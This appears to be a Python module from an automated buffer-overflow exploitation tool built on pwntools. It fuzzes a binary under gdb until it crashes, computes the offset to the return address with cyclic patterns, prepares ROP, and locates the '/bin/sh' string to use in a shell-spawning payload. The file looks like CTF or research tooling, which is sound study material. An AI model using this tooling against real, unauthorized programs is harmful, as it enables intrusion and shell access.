from pwn import *
import time
import subprocess
import sys
import re
from parser import *
from utils import *
from dynamic_analyser import *

MAX_ITERATIONS = 10

def get_fuzzing_dict(file):
    
    """
        Reads inputs from the fuzzing_dict.txt file to create the fuzzing dictionary 
        Arguments: 
            file: file containing the fuzzing dictionary

        Returns:
            values: a list containing the fuzzing words
    """
        
    
    values = []
    with open(file, 'r') as f:
        for line in f:
            values.append(line.strip())
    return values



def fuzzer(binary_file,Found, Fuzzing, delimiter):
    """
        Fuzzes the binary_file until it crashes with a segmentation fault or the maximum number of iterations is exceeded
        Arguments: 
            binary_file: the file to fuzz
            Found: a boolean value set to True when the input causing the SEGFAULT is found.
            Fuzzing: a boolean value set to True when we want to perform fuzzing using the fuzzing dictionary, otherwise use the hardcoded values.
            delimiter: a character used to decide when to stop reading from the process.
        Returns:
            n: the iteration at which the program crashed
            input: the input value disclosing the vulnerability
    """
        
    payload = b"A"*500   
    if Fuzzing != None:
        fuzzing_dict = get_fuzzing_dict("fuzzing.txt")
    else: 
        #Hardcoded values to speed up the process
        fuzzing_dict= [1]

    while not Found:
        for input in fuzzing_dict: 
            for i in range(MAX_ITERATIONS):
                j=0
                pr = process(["gdb", f"{binary_file}"])
                pause()
                pr.sendline("start")
                #pr.sendline("start")
                pr.sendline("run")
                while j<i:
                    print(f"question: {j} iteration {i}")
                    b = pr.recvuntil(delimiter, timeout=3)
                    pr.sendline(str(input))
                    j=j+1
                b = pr.recvuntil(delimiter, timeout=3)       
                pr.sendline(payload) 
                b = pr.recvline(timeout=3)    
                outcome=check_received_signal(b)
                n = check_result(i, outcome)
                if n >= 0:
                    Found = True
                    return n, input
                elif n == -1:
                    break   

                while True: 
                    pr.sendline(str(input))
                    received = pr.recvuntil(delimiter, timeout=1)      
                    outcome=check_received_signal(received)
                    n = check_result(i, outcome)
                    if n >= 0:
                        Found = True
                        return n, input
                    elif n == -1:
                        break
                

def get_vulneble_funct(binary_file, Fuzzer, delimiter):
    """
        Fuzzes the binary_file to get the iteration with the vulnerability and the input disclosing the vulnerability
        Arguments: 
            binary_file: the file to fuzz
            Fuzzer: a boolean value set to True when we want to perform fuzzing using the fuzzing dictionary
            delimiter: a character used to decide when to stop reading from the process.
        Returns:
            n: the iteration at which the program crashed
            input: the input value which caused the crash
    """
    Found = False
    payload = b"A"*500
    n, input = fuzzer(binary_file, Found, Fuzzer, delimiter)
    return n, input
     

def get_padding(process, delimiter):
    """
        Obtain the padding length to the return address
        Arguments: 
            process: the process considered
            delimiter: a character used to decide when to stop reading from the process output stream.
        Returns:
            offset: the padding length in bytes before the return address
            lines_after_output: the remaining lines before displaying the SEGFAULT message.
    """
    process.sendline(cyclic(500))
    lines_after_output = process.recvall()
    process.wait()
    fault_addr = process.corefile.fault_addr   
    core = process.corefile
    offset = cyclic_find(p64(fault_addr), n=4)
    process.kill()
    lines_after_output = line_counter(lines_after_output, delimiter)
    return offset,  lines_after_output





def get_offset(n, input,  binary_file, delimiter):
    """
        Obtain the offset length to the return address
        Arguments: 
            n: the iteration of the process containing the vulnerability
            input: the input disclosing the vulnerability
            binary_file: the binary file to consider
            delimiter: a character used to decide when to stop reading from the process output stream.
        Returns:
            offset: the padding length in bytes before the return address
            lines: the remaining lines before displaying the SEGFAULT message.
    """
    
    context.binary = binary = ELF(f"{binary_file}")
    rop=ROP(binary)
    p = process(f"{binary_file}")
    if n > 0: 
        for i in range(n):      
            o1=p.recvuntil(delimiter)
            print(o1)
            p.sendline(str(input))
            
    o1=p.recvuntil(delimiter) 
    print(o1) 
    offset, lines = get_padding(p, delimiter)
    return offset, lines


def search_bin_sh(binary_name):
    """
        Search the address of the bin/sh string in the binary file.
        Arguments: 
            binary_name: the name of the binary file to consider
            
        Returns:
            the bin/sh address as in integer
            
    """
    pr = process(["gdb", binary_name])
    pr.recvuntil("gef➤")
    pr.sendline("start")
    binsh=pr.recvuntil("gef➤")
    pr.sendline("search-pattern /bin/sh")
    binsh=pr.recvuntil("gef➤")
    bin=identify(binsh)
    pr.kill()
    return int(bin, 16)


def identify(binsh):
    """
        Obtain the bin/sh address in hexadecimal bytes
        Arguments: 
            binsh: the bin/sh address as an integer
        Returns:
            The bin/sh address in hexadecimal bytes
    """
    pattern = r'0x[0-9a-fA-F]+'
    data_str = binsh.decode('utf-8', 'ignore')
    matches = re.findall(pattern, data_str)
    if not matches:
        vprint("Binsh not found")
    return matches[2]
